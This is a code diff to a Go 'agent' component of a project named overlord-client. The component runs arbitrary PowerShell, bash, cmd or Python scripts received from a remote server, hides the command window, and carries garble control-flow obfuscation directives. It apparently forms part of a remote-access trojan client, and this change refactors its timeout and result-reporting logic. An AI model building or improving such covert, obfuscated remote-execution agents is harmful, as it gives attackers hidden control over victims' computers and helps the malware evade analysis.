@@ -12,33 +12,46 @@ import (
 	"overlord-client/cmd/agent/wire"
 )
 
+const scriptExecutionTimeout = 5 * time.Minute
+
+func StartScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, scriptContent string, scriptType string) {
+	goSafe("script execute", env.Cancel, func() {
+		if err := HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType); err != nil {
+			log.Printf("script: failed to send result for command %s: %v", cmdID, err)
+		}
+	})
+}
+
 func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, scriptContent string, scriptType string) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	log.Printf("script: executing %s script (length: %d bytes)", scriptType, len(scriptContent))
+
+	execCtx, cancel := context.WithTimeout(ctx, scriptExecutionTimeout)
+	defer cancel()
 
 	var cmd *exec.Cmd
 	switch scriptType {
 	case "powershell":
 		if runtime.GOOS == "windows" {
-			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
+			cmd = exec.CommandContext(execCtx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
 		} else {
 
-			cmd = exec.CommandContext(ctx, "pwsh", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
+			cmd = exec.CommandContext(execCtx, "pwsh", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
 		}
 	case "bash":
 		if runtime.GOOS == "windows" {
 
-			cmd = exec.CommandContext(ctx, "bash", "-c", scriptContent)
+			cmd = exec.CommandContext(execCtx, "bash", "-c", scriptContent)
 		} else {
-			cmd = exec.CommandContext(ctx, "bash", "-c", scriptContent)
+			cmd = exec.CommandContext(execCtx, "bash", "-c", scriptContent)
 		}
 	case "sh":
-		cmd = exec.CommandContext(ctx, "sh", "-c", scriptContent)
+		cmd = exec.CommandContext(execCtx, "sh", "-c", scriptContent)
 	case "cmd":
 		if runtime.GOOS == "windows" {
-			cmd = exec.CommandContext(ctx, "cmd.exe", "/c", scriptContent)
+			cmd = exec.CommandContext(execCtx, "cmd.exe", "/c", scriptContent)
 		} else {
-			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			return writeScriptCommandResult(env, wire.CommandResult{
 				Type:      "command_result",
 				CommandID: cmdID,
 				OK:        false,
@@ -46,11 +59,11 @@ func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID strin
 			})
 		}
 	case "python":
-		cmd = exec.CommandContext(ctx, "python", "-c", scriptContent)
+		cmd = exec.CommandContext(execCtx, "python", "-c", scriptContent)
 	case "python3":
-		cmd = exec.CommandContext(ctx, "python3", "-c", scriptContent)
+		cmd = exec.CommandContext(execCtx, "python3", "-c", scriptContent)
 	default:
-		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+		return writeScriptCommandResult(env, wire.CommandResult{
 			Type:      "command_result",
 			CommandID: cmdID,
 			OK:        false,
@@ -60,25 +73,21 @@ func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID strin
 
 	hideCmdWindow(cmd)
 
-	timeout := 5 * time.Minute
-	ctx, cancel := context.WithTimeout(ctx, timeout)
-	defer cancel()
-
 	output, err := cmd.CombinedOutput()
 
 	if err != nil {
 
-		if ctx.Err() == context.DeadlineExceeded {
-			return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
+		if execCtx.Err() == context.DeadlineExceeded {
+			return writeScriptResult(env, wire.ScriptResult{
 				Type:      "script_result",
 				CommandID: cmdID,
 				OK:        false,
 				Output:    string(output),
-				Error:     "Script execution timed out after " + timeout.String(),
+				Error:     "Script execution timed out after " + scriptExecutionTimeout.String(),
 			})
 		}
 
-		return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
+		return writeScriptResult(env, wire.ScriptResult{
 			Type:      "script_result",
 			CommandID: cmdID,
 			OK:        false,
@@ -88,10 +97,22 @@ func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID strin
 	}
 
 	log.Printf("script: execution completed successfully (%d bytes output)", len(output))
-	return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
+	return writeScriptResult(env, wire.ScriptResult{
 		Type:      "script_result",
 		CommandID: cmdID,
 		OK:        true,
 		Output:    strings.TrimSpace(string(output)),
 	})
+}
+
+func writeScriptResult(env *agentRuntime.Env, result wire.ScriptResult) error {
+	writeCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	return wire.WriteMsg(writeCtx, env.Conn, result)
+}
+
+func writeScriptCommandResult(env *agentRuntime.Env, result wire.CommandResult) error {
+	writeCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	return wire.WriteMsg(writeCtx, env.Conn, result)
 }
